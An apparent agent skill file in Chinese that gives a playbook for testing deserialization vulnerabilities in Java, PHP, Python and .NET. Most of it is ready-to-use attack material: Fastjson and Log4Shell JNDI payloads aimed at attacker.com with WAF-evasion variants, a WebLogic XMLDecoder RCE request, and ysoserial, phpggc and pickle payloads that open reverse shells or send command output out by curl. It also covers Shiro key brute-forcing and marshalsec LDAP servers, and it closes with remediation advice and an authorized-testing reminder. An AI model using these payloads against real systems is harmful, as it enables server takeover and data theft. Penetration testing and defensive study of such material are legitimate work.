---
name: deserialization-testing
description: 反序列化漏洞深度测试技能：Java/PHP/Python/.NET全语言、常见Gadget库、CommonsCollections/Fastjson/Shiro/Log4j等历史高危链、ysoserial/PhpGC工具使用、WAF绕过
version: 2.0.0
---

# 反序列化漏洞深度测试技能

## 概述

反序列化漏洞发生在应用程序将不受信任的数据反序列化为对象时，攻击者通过构造恶意序列化数据在反序列化过程中触发任意代码执行。Java生态（CommonsCollections/Fastjson/Shiro/WebLogic）、PHP（Phar/魔术方法）、Python（pickle）、.NET（BinaryFormatter/ViewState）均存在历史高危RCE链。本技能覆盖四大语言全Gadget链、识别方法、利用工具、WAF绕过、防御绕过。

## 一、反序列化攻击面

### 1.1 反序列化入口识别
| 语言 | 入口点 | 特征 |
|------|--------|------|
| Java | `ObjectInputStream.readObject()`、`readUnshared()`、XMLDecoder/XStream/JsonDecoder/Hessian/Kryo/FST、Jackson enableDefaultTyping、Fastjson autoType、RMI/JMX/JNDI | Content-Type: application/x-java-serialized-object、二进制以`\xac\xed\x00\x05`开头、Base64编码以`rO0`开头 |
| PHP | `unserialize()`、Phar文件交互(phar://)、Session反序列化 | 字符串以`a:2:{i:0;...}`格式、Phar文件元数据 |
| Python | `pickle.loads()`/`cPickle.loads()`、`yaml.load()`、`marshal.loads()`、Shelve | pickle以`\x80\x03`/`\x80\x04`开头；yaml.load非安全加载 |
| .NET | `BinaryFormatter.Deserialize()`、`LosFormatter.Deserialize()`、ViewState、Json.NET TypeNameHandling | BinaryFormatter二进制、ViewState Base64（结尾可能有签名）|
| Ruby | `Marshal.load()`、`YAML.load()` | Marshal二进制格式 |
| Node.js | `node-serialize`、`serialize-to-js`、`js-yaml` unsafeLoad | 函数序列化 |
| Go | `gob.Decode`、自定义反序列化 | Gob格式 |

### 1.2 数据传输格式
- **二进制序列化**：Java原生序列化（rO0开头Base64）.NET BinaryFormatter
- **JSON**：Fastjson `@type`字段、Jackson `@class`、Json.NET `$type`
- **XML**：XStream、XMLDecoder、.NET SoapFormatter
- **YAML**：PyYAML（!!python/object）、SnakeYAML（!!）
- **Hessian/Burlap**：Dubbo等RPC框架
- **AMF**：BlazeDS/AMF0/AMF3
- **Protobuf/Thrift/Avro**：一般安全，除非有自定义逻辑
- **ViewState**：ASP.NET ViewState反序列化

### 1.3 常见框架/组件高危CVE
| 组件 | CVE/版本 | Gadget/RCE |
|------|---------|-----------|
| Apache Commons Collections 3.x/4.x | CVE-2015-7501 | CC1-CC7链 |
| Fastjson 1.2.24-1.2.83 | 多个autoType绕过 | JNDI/RCE |
| Jackson | CVE-2017-17485/CVE-2019-12384 | enableDefaultTyping RCE |
| Apache Shiro <=1.2.4 | CVE-2016-4437 | RememberMe反序列化 |
| WebLogic | CVE-2015-4852/CVE-2017-10271/CVE-2020-2555等 | T3/IIOP RCE |
| WebSphere | CVE-2015-7450 | RCE |
| JBoss | CVE-2017-12149/JMXInvoker | 反序列化RCE |
| Jenkins | CVE-2015-8103/CVE-2016-0788 | 反序列化RCE |
| Apache Log4j | CVE-2021-44228 (Log4Shell) | JNDI注入RCE |
| Spring Framework | CVE-2016-1000027 (tied to commons-collections)| RCE |
| Apache dubbo/Hessian | Hessian反序列化 | RCE |
| XStream | CVE-2021-21342等多个 | RCE |
| SnakeYAML | CVE-2022-1471/默认不安全 | RCE |
| PHP Laravel/RCE | CVE-2018-15133等多个 | POP链 |
| WordPress/Python Django Pickle | Session/cookie反序列化 | RCE |
| Apache Solr/Lucene | 多个版本 | RCE |
| Adobe Experience Manager | 多个CVE | 反序列化 |
| .NET ViewState | 无machineKey验证 | RCE |
| .NET BinaryFormatter（常见）| 任何使用BinaryFormatter的代码 | RCE |
| Apache OFBiz/Nexus/ManageEngine等 | 多个 | RCE |

## 二、Java反序列化

### 2.1 识别特征
```http
# HTTP请求体二进制流识别
Content-Type: application/x-java-serialized-object
# 二进制前4字节为: AC ED 00 05 (stream magic + version)

# Base64编码识别
POST / HTTP/1.1
Cookie: rememberMe=eyJhY2NvdW50IjpbeyJ1c2VybmFtZSI6ImFkbWlu... (rO0开头)
Body: rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2...
```

### 2.2 CommonsCollections链分类
| 链 | 触发类 | JDK版本限制 | 利用条件 |
|----|--------|-----------|---------|
| CC1 (LazyMap+AnnotationInvocationHandler) | TransformedMap/LazyMap | JDK<8u71 | commons-collections:3.x |
| CC2 (PriorityQueue+TemplatesImpl+InvokerTransformer) | PriorityQueue | 无严格限制 | commons-collections4 |
| CC3 (TrAXFilter+TemplatesImpl) | InstantiateTransformer | 无严格限制 | commons-collections3/4 |
| CC4 | InstantiateTransformer+InstantiateFactory | 同CC3 | commons-collections4 |
| CC5 (TiedMapEntry+BadAttributeValueExpException) | LazyMap | JDK<8u71 | commons-collections |
| CC6 (HashSet+TiedMapEntry+LazyMap) | 不依赖AnnotationInvocationHandler | JDK 7/8全版本 | commons-collections |
| CC7 (Hashtable+LazyMap) | Hashtable | JDK 8u71+ | commons-collections |

### 2.3 其他Java Gadget库
```
- CommonsBeanutils (CB1/CB1.92)：PropertyPathFactoryChain/BeanComparator
- Spring Framework (Spring1/Spring2)：MethodInvokeTypeProvider/JdkDynamicAopProxy
- Groovy：Groovyc/MethodClosure
- JRE (Jdk7u21/Jdk8u20/Jdk8u25)：sun.reflect.annotation.*无依赖链
- Hibernate：Hibernate1/Hibernate2
- Rome：Rome链
- Vaadin
- Click-n-Cheat
- CommonsBeanutilsComparator
- XBean
- Wicket
- Apache Commons FileUpload (DiskFileItem)
- Jython
- Mozilla Rhino
```

### 2.4 Fastjson利用
```json
// 1.2.24 基础RCE (JdbcRowSetImpl JNDI)
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com:1389/Exploit","autoCommit":true}

// 1.2.25-1.2.41 autoType绕过
{"@type":"Lcom.sun.rowset.JdbcRowSetImpl;","dataSourceName":"ldap://attacker.com/Exploit","autoCommit":true}
{"@type":"[com.sun.rowset.JdbcRowSetImpl"[,"dataSourceName":"ldap://attacker.com/Exploit","autoCommit":true}

// 1.2.42-1.2.45 双写L绕过
{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;","dataSourceName":"ldap://attacker.com/Exploit","autoCommit":true}

// 1.2.47 黑名单绕过 (autoTypeSupport未开启也可利用)
{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/Exploit","autoCommit":true}}

// 1.2.68 autoType绕过 (expectClass/Throwable)
{"@type":"java.lang.AutoCloseable","@type":"x.B","x":{"@type":"java.lang.AutoCloseable","@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/Exploit","autoCommit":true}}

// 1.2.68 GZIPInputStream绕过
// 1.2.80 safemode绕过异常类
{"@type":"java.lang.Exception","@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/Exploit","autoCommit":true}
```

### 2.5 Shiro RememberMe
```
特征：Cookie rememberMe=xxx，AES-128-CBC加密
默认密钥：kPH+bIxk5D2deZiIxcaaaA== (Base64: aW1wb3J0...不是，实际为硬编码密钥)

检测：发送rememberMe=1，响应中存在rememberMe=deleteMe

利用步骤：
1. 检查Shiro版本
2. 爆破密钥（shiro_tool/ShiroExploit遍历100+默认密钥）
3. 找到密钥后使用ysoserial生成Gadget
4. AES-CBC加密后发送rememberMe Cookie

常见Gadget链：
- CommonsCollections2/3/4/5/6/7
- CommonsBeanutils1（最稳定，仅需commons-beanutils依赖）
- CommonsBeanutils2
- Groovy1
- Spring1/Spring2
- Jdk7u21（无依赖但需JDK版本匹配）
```

### 2.6 WebLogic T3/IIOP
```
端口：7001 (HTTP)、7002 (HTTPS)
协议：T3、IIOP、HTTP

T3反序列化：
- 连接T3端口，发送T3头
- 发送序列化数据

XMLDecoder RCE（CVE-2017-10271/CVE-2019-2725）：
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Content-Type: text/xml

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
<soapenv:Header><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<java version="1.8.0" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder"><array class="java.lang.String" length="3"><void index="0"><string>/bin/bash</string></void><void index="1"><string>-c</string></void><void index="2"><string>id</string></void></array><void method="start"/></void>
</java>
</work:WorkContext></soapenv:Header><soapenv:Body/>
</soapenv:Envelope>
```

### 2.7 JNDI注入（Log4Shell类）
```
# 利用JNDI注入（RMI/LDAP+远程类加载）
# JDK 8u191+默认禁止远程codebase加载，需本地Gadget或LDAP序列化
# Log4j2 JNDI Lookup：
${jndi:ldap://attacker.com:1389/obj}
${jndi:rmi://attacker.com:1099/obj}
${jndi:dns://attacker.com/xxx}   （DNS外带检测）
${jndi:ldap://${hostName}.attacker.com/obj}  （外带hostname）

# 绕过WAF的变形
${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://attacker.com/obj}
${${::-j}ndi:ldap://attacker.com/obj}
${${env:FOO:-j}ndi:ldap://attacker.com/obj}
%24%7Bjndi:ldap://attacker.com/obj%7D
```

### 2.8 ysoserial工具使用
```bash
# 列出可用Payload
java -jar ysoserial.jar

# 生成Payload
java -jar ysoserial.jar CommonsCollections1 'touch /tmp/pwned' > cc1.ser
java -jar ysoserial.jar CommonsCollections6 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci5jb20vNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}' > cc6.ser
java -jar ysoserial.jar CommonsBeanutils1 'curl http://attacker.com/$(id|base64)' > cb1.ser
java -jar ysoserial.jar Jdk7u21 'id' > jdk7u21.ser
java -jar ysoserial.jar URLDNS 'http://xxx.dnslog.cn' > urldns.ser  （检测反序列化是否存在，无RCE）

# 发送到目标
cat cc1.ser | curl -s -X POST -H 'Content-Type: application/x-java-serialized-object' --data-binary @- http://target.com/endpoint

# Base64编码后发送
java -jar ysoserial.jar CommonsCollections6 'id' | base64 -w0
```

### 2.9 WAF绕过（Java反序列化）
```
# 1. 数据包分包（chunked encoding）
Transfer-Encoding: chunked
将payload分块发送，某些WAF不完整组装

# 2. Content-Type变换
Content-Type: application/octet-stream
Content-Type: ;application/x-java-serialized-object
Content-Type: application/x-java-serialized-object;charset=utf-8
Content-Type: multipart/form-data; field=data (payload在form字段中)

# 3. Gzip压缩
Content-Encoding: gzip
对序列化数据gzip压缩

# 4. 序列化数据混淆
- 在合法序列化对象前后插入垃圾数据
- 利用TC_RESET/TC_REFERENCE嵌套
- 嵌套数组/对象增加深度

# 5. HTTP参数污染
data=...&data=...（两个data参数）

# 6. 编码
?data=rO0ABX... (Base64 URL编码)
?data=AC%20ED%00%05... (Hex URL编码)

# 7. POST→GET转换（若接受GET参数）
GET /endpoint?data=<base64payload> HTTP/1.1

# 8. HTTP Header注入
X-Forwarded-For: <payload>
Cookie: data=<payload>
X-Token: <payload>
```

## 三、PHP反序列化

### 3.1 识别特征
```php
// unserialize()调用
$obj = unserialize($_COOKIE['data']);

// 序列化格式
a:2:{i:0;s:4:"test";i:1;s:4:"test";}
O:4:"User":2:{s:4:"name";s:5:"admin";s:3:"age";i:20;}
```

### 3.2 PHP魔术方法POP链
```php
__construct()        // 创建对象时调用
__destruct()         // 对象销毁时调用
__wakeup()           // unserialize()时调用（CVE-2016-7124绕过）
__toString()         // 对象被当作字符串时调用
__get($name)         // 访问不存在属性
__set($name,$value)  // 设置不存在属性
__isset()            // isset()/empty()访问不存在属性
__unset()            // unset()不存在属性
__invoke()           // 对象被当作函数调用
__call($m,$a)        // 调用不存在方法
__callStatic()       // 静态调用不存在方法
__sleep()            // serialize()之前调用
__clone()            // clone对象时
```

**POP链构造思路：**
```
1. 起点：unserialize()可到达的魔术方法（__destruct/__wakeup/__toString常见）
2. 链点：A方法调用B方法，B调用C...
3. 终点：危险函数（system/exec/eval/file_get_contents/require/include）
```

### 3.3 知名PHP框架POP链
- Laravel多个版本RCE
- Symfony RCE
- ThinkPHP RCE
- Doctrine
- Monolog/SwiftMailer
- Drupal/WordPress/ Magento插件
- PhpGC（PHP Generic Gadget）工具

**CVE-2016-7124（__wakeup绕过）：**
```php
// 对象属性个数大于实际个数时__wakeup不执行
O:4:"Test":1:{s:3:"cmd";s:2:"id";}   // 正常，触发__wakeup
O:4:"Test":2:{s:3:"cmd";s:2:"id";}   // 2>1，绕过__wakeup
```

### 3.4 Phar反序列化
```php
// Phar文件元数据在任何文件操作函数中触发反序列化（不需要unserialize()）
// 触发条件：phar://伪协议 + 文件操作函数（file_exists/fopen/file_get_contents等）
// 利用：上传Phar文件（改名jpg/gif等）+ phar://触发

file_exists('phar://upload/avatar.phar/test.txt');   // 触发元数据反序列化
// 生成Phar: phpggc -p phar Laravel/RCEx system id > payload.phar

// Phar伪装：修改phar文件头加GIF89a绕过上传
```

### 3.5 phpggc（PHP Generic Gadget Chains）使用
```bash
# 列出所有Gadget
./phpggc -l

# 生成Payload
./phpggc Laravel/RCE system id
./phpggc Monolog/RCE1 system id
./phpggc SwiftMailer/FW1 system id
./phpggc ThinkPHP/RCE1 system id

# 生成Phar格式
./phpggc -p phar Laravel/RCE1 system id > payload.phar

# 快速命令（编码+封装）
./phpggc Laravel/RCE1 system 'bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"' | base64 -w0

# 加wrapper
./phpggc -w phar://xxx Monolog/RCE1 system id
```

### 3.6 Session反序列化
```php
// php_serialize/php/php_binary三种引擎不一致导致
// php: key|value（value被serialize处理）
// php_serialize: 全serialize存储
// 若引擎不一致，构造|O:4:"Test":1:{...} 注入对象
```

## 四、Python反序列化

### 4.1 危险函数
```python
# pickle（最高危）
import pickle
pickle.loads(user_input)
cPickle.loads(user_input)

# PyYAML
import yaml
yaml.load(user_input)      # 不安全！应使用yaml.safe_load()

# marshal
import marshal
marshal.loads(user_input)

# shelve
import shelve              # 基于pickle
```

### 4.2 Pickle RCE构造
```python
import pickle, os

# 方法1：__reduce__
class Pwn(object):
    def __reduce__(self):
        return (os.system, ('id',))

payload = pickle.dumps(Pwn())
pickle.loads(payload)

# 方法2：直接利用builtins
# pickle opcode构造：直接调用exec/eval
# cos\nsystem\n(S'id'\ntR.  （opcode：c=global, o=instance, R=apply, .=stop）
import pickletools
pickletools.dis(payload)

# 生成反弹Shell payload
import pickle, base64
cmd = "bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'"
class RCE:
    def __reduce__(self):
        import os
        return (os.system, (cmd,))
print(base64.b64encode(pickle.dumps(RCE())).decode())
```

### 4.3 PyYAML RCE
```yaml
!!python/object/apply:os.system ["id"]
!!python/object/apply:subprocess.check_output [["id"]]
!!python/object/new:subprocess.Popen [["id"]]
```

### 4.4 安全加载绕过
```python
# 开发者使用Unpickler但未限制find_class，仍可RCE
import pickle
class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        # 错误的白名单仍可能被绕过
        ...
```

## 五、.NET反序列化

### 5.1 危险入口
```csharp
// BinaryFormatter（高危）
new BinaryFormatter().Deserialize(stream);

// LosFormatter
new LosFormatter().Deserialize(stream);

// ViewState（未启用MAC验证）
// JavaScriptSerializer/Json.NET TypeNameHandling
JsonConvert.DeserializeObject(json, new JsonSerializerSettings{TypeNameHandling = TypeNameHandling.All})

// SoapFormatter
// NetDataContractSerializer
// DataContractSerializer（默认安全）
```

### 5.2 ViewState反序列化
```
- 无ViewStateUserKey/MachineKey时可伪造ViewState
- ASP.NET web.config中enableViewStateMac=false或machineKey可预测
- ViewState是Base64序列化对象
- 使用ysoserial.net生成payload
- 常见路径：/Page.aspx?__VIEWSTATE=<payload>
```

### 5.3 ysoserial.net使用
```cmd
:: 列出Payload
ysoserial.net -l

:: 生成Payload
ysoserial.net -g ActivitySurrogateSelector -c "cmd /c whoami" -o BinaryFormatter
ysoserial.net -g ObjectDataProvider -c "cmd /c calc" -f JavaScriptSerializer
ysoserial.net -g ViewState -c "cmd /c whoami" --path="/page.aspx" --apppath="/" --validationalg="SHA1" --validationkey="..."
ysoserial.net -g TextFormattingRunProperties -c "powershell -e <base64>" -o BinaryFormatter

:: 生成PowerShell反弹Shell
ysoserial.net -g ActivitySurrogateSelectorFromFile -c "shell.ps1;System.dll" -o BinaryFormatter
```

### 5.4 .NET Gadget链
- ActivitySurrogateSelector（最稳定，通过WPF Activity实现跨AppDomain RCE）
- ObjectDataProvider
- ClaimsIdentity
- TextFormattingRunProperties
- ToolboxItemContainer/LogicalCallContext
- SessionSecurityTokenHandler
- WindowsClaimsIdentity
- ViewState（专用）

## 六、检测与验证

### 6.1 黑盒检测
```
1. URLDNS/HTTP/DNS外带检测（最安全无RCE）
   Java: URLDNS gadget（产生DNS请求）
   PHP/通用：反序列化触发DNS请求
2. 触发延迟：payload包含sleep 5/Thread.sleep(5000)
3. 错误信息：反序列化异常可能泄露类路径/依赖
4. 特征识别：
   - Java: rO0AB/AC ED 00 05
   - PHP: O:N:格式
   - Python: \x80\x04\x95
   - .NET: BinaryFormatter头
```

### 6.2 DNS外带Payload生成
```bash
# Java URLDNS（最通用，任何环境都可触发DNS解析）
java -jar ysoserial.jar URLDNS http://xxx.dnslog.cn > dns.ser
# 发送后检查dnslog.cn是否收到解析

# PHP: 构造一个调用DNS的对象（SplStack+SplObjectStorage+SoapClient/Socket）
# Python: pickle构造socket.gethostbyname
```

### 6.3 白盒代码审计
```
搜索关键字：
- Java: readObject, readUnshared, XMLDecoder, XStream, ObjectInputStream, Fastjson parse, Jackson ObjectMapper.enableDefaultTyping
- PHP: unserialize, phar://, yaml_parse
- Python: pickle.loads, yaml.load, marshal.load, shelve
- .NET: BinaryFormatter, LosFormatter, Deserialize, ViewState, TypeNameHandling
- 搜索库版本：pom.xml/requirements.txt/composer.json/packages.config检查已知CVE依赖
```

## 七、防护绕过与WAF对抗

### 7.1 序列化数据变形
```
# Java: TC_RESET插入、嵌套对象、数据块分割
# PHP: 字符串长度修改大小写（s:4:"Test"/S:4:"\74\65\73\74"）
# Python: 重写opcode，增加冗余REDUCE/MEMOIZE
# .NET: BindingFlags/Reflection代理链
```

### 7.2 流量层绕过
```http
Content-Type: application/octet-stream
Content-Encoding: gzip/deflate
Transfer-Encoding: chunked
POST参数: multipart/form-data字段名不常见
```

### 7.3 JDK版本限制绕过
- JDK 8u191+远程类加载禁用 → 使用本地Gadget链（CC/Beanutils等）
- JDK高版本JRE限制AnnotationInvocationHandler → 使用CC6/CC7链

## 八、工具链

| 工具 | 语言 | 用途 |
|------|------|------|
| ysoserial | Java | Java反序列化Payload生成（CC/Spring/Fastjson等）|
| ysoserial.net | .NET | .NET反序列化Payload |
| marshalsec | Java | JNDI/RMI/LDAP服务器，反序列化利用辅助 |
| JNDI-Injection-Exploit | Java | JNDI注入利用服务器 |
| phpggc | PHP | PHP POP链生成 |
| phpggc-laravel | PHP | Laravel专用 |
| pickle_inject | Python | Pickle Payload生成 |
| SerializationDumper | Java | 序列化数据解析 |
| shiro-tools/ShiroExploit | Java | Shiro RememberMe密钥爆破 |
| Burp Suite JavaDeserializationScanner | Java | Burp插件扫描 |
| GadgetProbe | Java | 探测Gadget存在性 |
| JRE8u20/JRE7u21 | Java | JDK无依赖Gadget |

### 8.1 marshalsec/JNDI服务器
```bash
# 启动LDAP/RMI服务器（JNDI注入）
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://attacker.com/#Exploit" 1389
java -cp marshalsec.jar marshalsec.jndi.RMIRefServer "http://attacker.com/#Exploit" 1099

# JNDI-DNS外带检测（类似URLDNS，触发DNS）
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://xxx.dnslog.cn/#Exploit 1389
```

### 8.2 Shiro爆破密钥
```bash
# ShiroAttack2/ShiroExploit
java -jar ShiroExploit.jar
# 输入目标URL，自动爆破密钥并注入Gadget
```

## 九、反序列化测试清单

- [ ] 所有接收序列化数据的端点（Java/PHP/Python/.NET）
- [ ] Content-Type识别（application/x-java-serialized-object）
- [ ] Cookie（rememberMe/session/csrf）
- [ ] rememberMe Shiro检测
- [ ] Fastjson接口（@type字段、autoType绕过）
- [ ] JSON解析器（Jackson default typing）
- [ ] XML反序列化（XStream/XMLDecoder）
- [ ] YAML反序列化（SnakeYAML/PyYAML）
- [ ] PHP unserialize参数
- [ ] Phar文件上传+phar://触发
- [ ] Python pickle/yaml/marshal入口
- [ ] .NET ViewState/BinaryFormatter/JSON TypeNameHandling
- [ ] Hessian/Dubbo RPC接口
- [ ] RMI/JMX/JNDI端口（1099/9010/3700等）
- [ ] T3/IIOP（WebLogic 7001）
- [ ] JMXInvoker（JBoss 8080）
- [ ] URLDNS/DNS外带验证
- [ ] 组件版本指纹识别（commons-collections/fastjson/shiro）
- [ ] 已知CVE匹配
- [ ] POP链/Gadget库存在性检测
- [ ] WAF绕过（chunked/gzip/Content-Type变换/编码）
- [ ] 反序列化触发点的依赖分析（代码审计时）

## 十、修复建议

- **避免原生反序列化**：使用JSON/Protobuf等纯数据格式替代原生二进制序列化
- **白名单类加载**：ObjectInputStream重写resolveClass做类白名单
- **禁用危险机制**：Fastjson设置safeMode/safeAutoType；Jackson禁用default typing
- **更新依赖**：及时更新存在反序列化CVE的库版本
- **Harden JNDI**：JDK高版本默认配置（trustURLCodebase=false）
- **Shiro密钥管理**：每个应用唯一AES密钥，不使用默认密钥
- **MachineKey保护ViewState**：ASP.NET启用ViewState MAC验证，强MachineKey
- **BinaryFormatter禁用**：.NET迁移到XmlSerializer/DataContractSerializer/Json.NET（TypeNameHandling.None）
- **yaml.safe_load()**：PyYAML使用safe_load；SnakeYAML禁用构造器
- **WAF规则**：检测序列化特征（rO0/O:N:/@type/AC ED 00 05）
- **最小权限**：应用进程低权限，限制出站网络（阻断JNDI LDAP/RMI出站）
- **RASP/运行时防护**：hook危险反序列化调用，阻断执行链

## 注意事项

- **仅限授权测试**：反序列化RCE直接获取服务器权限，必须严格在授权范围内
- **URLDNS优先验证**：测试时优先使用无RCE的DNS外带payload确认漏洞存在
- **Payload编码**：注意二进制数据在HTTP传输中需使用raw body或base64
- **JDK版本影响**：不同JDK版本可用Gadget链不同，需多链尝试
- **依赖存在性**：Gadget链需要目标classpath存在对应库，不是每次都能成功
- **Shiro密钥爆破**：默认密钥常见，但现代应用通常自定义密钥
- **Fastjson绕过版本**：每个小版本都有新绕过，需查阅最新绕过
- **合规要求**：遵守《网络安全法》，仅在授权范围内测试，测试后及时报告
